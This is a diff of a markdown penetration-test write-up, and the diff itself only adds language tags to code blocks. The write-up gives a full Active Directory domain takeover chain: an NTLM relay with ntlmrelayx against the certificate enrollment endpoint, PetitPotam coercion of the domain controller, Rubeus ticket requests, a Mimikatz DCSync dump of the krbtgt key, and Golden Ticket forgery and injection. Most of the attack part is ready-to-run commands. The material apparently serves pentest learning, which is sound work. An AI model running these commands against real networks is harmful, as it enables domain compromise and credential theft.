@@ -46,13 +46,13 @@ Now I've got the domain name for the CA Web Enrollment Interface at `https://ca-
 With this, I was able to launch the ADCS Relay attack.
 
 From the attacker box, launch `ntlmrelayx.py`:
-```
+```bash
 ntlmrelayx.py -debug -smb2support --target https://ca-hostname/certsrv/certfnsh.asp --adcs --template domaincontroller
 ```
 The `--template` argument would depend on the account that would be relayed. Since I was relaying a DC, then the template should be `domaincontroller`, you could enumerate the template on the ADCS using Certify: `Certify.exe cas`
 
 On another window on the attacker box, launch [PetitPotam](https://github.com/topotam/PetitPotam) against the DC:
-```
+```bash
 sudo python3 petitpotam.py <Attack box's IP> <DC's IP>
 ```
 
@@ -62,24 +62,24 @@ The attack was successful, on the ntlmrelayx window, a Base64 encoded certificat
 
 
 From here, I proceeded with requesting for a TGT of DC$ using `Rubeus`:
-```
+```powershell
 Rubeus.exe asktgt /user:DC$ /domain:<domain> /certificate:<base64-certificate> /ptt
 ```
 With the `/ptt` option, the returned TGT of DC$ would be imported into my current user session.
 \
 From here, a threat actor can aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
 Launch Mimikatz and dump the AES256 encryption key:
-```
+```powershell
 # From mimikatz:
 lsadump::dcsync /domain:<domain> /user:krbtgt
 ```
 Once the AES256 encryption key of the krbtgt account has been captured, the Golden Ticket could be forged:
-```
+```powershell
 # From Mimikatz:
 kerberos::golden /user:Administrator /domain:<domain> /sid:<SID of the domain> /aes256:<aes256 key> /ticket:goldie.kirbi
 ```
 Proceed to inject the Golden Ticket:
-```
+```powershell
 Rubeus.exe ptt /ticket:goldie.kirbi
 ```
 GG!
